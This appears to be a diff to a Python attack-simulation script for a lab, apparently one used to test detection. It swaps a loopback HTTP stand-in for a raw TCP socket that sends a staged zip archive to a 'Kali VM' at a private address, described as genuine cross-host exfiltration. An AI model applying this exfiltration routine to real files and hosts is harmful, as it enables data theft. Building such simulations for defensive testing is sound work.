@@ -21,17 +21,14 @@ import time
 import os
 import sys
 import shutil
-import threading
-import http.server
-import socketserver
-import urllib.request
+import socket
 from datetime import datetime
 
 LOG_PATH = r"C:\AttackSim\scenario3_timestamps.log"
 STAGING_DIR = r"C:\AttackSim\staging"
 ARCHIVE_PATH = r"C:\AttackSim\staging_archive.zip"
-EXFIL_PORT = 8090
-EXFIL_URL = f"http://127.0.0.1:{EXFIL_PORT}/upload"
+EXFIL_PORT = 9001
+EXFIL_HOST = "192.168.31.129"  # Kali VM
 
 
 def log(message: str):
@@ -69,42 +66,22 @@ def stage2_archive():
         log(f"STAGE2_ARCHIVE_ERROR: {e}")
 
 
-class _QuietHandler(http.server.BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers.get("Content-Length", 0))
-        self.rfile.read(content_length)
-        self.send_response(200)
-        self.end_headers()
-
-    def log_message(self, format, *args):
-        pass  # suppress default stderr logging, we have our own log()
-
-
-def _run_listener(server):
-    server.handle_request()  # handle exactly one request, then stop
-
 
 def stage3_exfiltrate():
-    """Sends the archive to an 'external' address via HTTP POST. Currently
-    a loopback stand-in -- see module docstring."""
+    """Sends the archive to a real second machine (Kali VM) via raw TCP --
+    genuine cross-host connection, no longer a loopback stand-in."""
     log("STAGE3_EXFILTRATION_START")
-
     try:
-        server = socketserver.TCPServer(("127.0.0.1", EXFIL_PORT), _QuietHandler)
-        listener_thread = threading.Thread(target=_run_listener, args=(server,))
-        listener_thread.start()
-        time.sleep(0.5)  # let the listener start
-
         with open(ARCHIVE_PATH, "rb") as f:
             data = f.read()
 
-        req = urllib.request.Request(EXFIL_URL, data=data, method="POST")
-        urllib.request.urlopen(req, timeout=5)
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.settimeout(10)
+        client.connect((EXFIL_HOST, EXFIL_PORT))
+        client.sendall(data)
+        client.close()
 
-        listener_thread.join(timeout=5)
-        server.server_close()
-
-        log("STAGE3_EXFILTRATION_COMPLETE")
+        log(f"STAGE3_EXFILTRATION_COMPLETE: sent to {EXFIL_HOST}:{EXFIL_PORT}")
     except Exception as e:
         log(f"STAGE3_ERROR: {e}")
 
